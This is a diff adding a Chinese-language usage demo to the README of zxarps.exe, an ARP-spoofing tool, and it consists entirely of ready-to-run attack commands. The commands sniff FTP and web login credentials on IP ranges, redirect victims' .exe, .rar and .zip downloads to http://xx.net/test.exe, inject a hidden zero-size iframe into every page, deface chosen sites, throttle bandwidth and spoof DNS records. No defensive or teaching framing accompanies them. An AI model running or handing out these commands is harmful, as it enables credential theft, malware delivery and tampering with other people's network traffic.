@@ -42,3 +42,34 @@ options:
     -spoofmode [1|2|3]        将数据骗发到本机,欺骗对象:1为网关,2为目标机,3为两者
     -speed [kb]               限制指定的IP或IP段的网络总带宽,单位:KB（zxarps.exe -idx 2 -ip 192.168.10.177 -speed 1）
 ```
+#### Demo
+```txt
+嗅探指定的IP段中端口80的数据，并以HEX模式写入文件
+zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -save_h sniff.log
+
+FTP嗅探,在21或2121端口中出现USER或PASS的数据包记录到文件
+zxarps.exe -idx 0 -ip 192.168.0.2 -port 21,2121 -spoofmode 2 -logfilter "_USER ,_PASS" -save_a sniff.log
+
+HTTP web邮箱登陆或一些论坛登陆的嗅探,根据情况自行改关键字
+zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -logfilter "+POST ,+user,+pass" -save_a sniff.log
+
+用|添加嗅探条件,这样FTP和HTTP的一些敏感关键字可以一起嗅探
+zxarps.exe -idx 0 -ip 192.168.0.2 -port 80,21 -logfilter "+POST ,+user,+pass|_USER ,_PASS" -save_a sniff.log
+
+如果嗅探到目标下载文件后缀是exe等则更改Location:为http://xx.net/test.exe
+zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.12,192.168.0.20-192.168.0.30 -spoofmode 3 
+-postfix ".exe,.rar,.zip" -hackurl http://xx.net/ -filename test.exe
+
+指定的IP段中的用户访问到-hacksite中的网址则只显示just for fun
+zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -hacksite 222.2.2.2,www.a.com,www.b.com 
+-insert "just for fun<noframes>"
+
+指定的IP段中的用户访问的所有网站都插入一个框架代码
+zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -insert "<iframe src='xx' width=0 height=0>"
+
+指定的两个IP的总带宽限制到20KB
+zxarps.exe -idx 0 -ip 192.168.0.55,192.168.0.66 -speed 20
+
+DNS欺骗
+zxarps.exe -idx 0 -ip 192.168.0.55,192.168.0.66 -hackdns "www.aa.com|222.22.2.2,www.bb.com|1.1.1.1"
+```
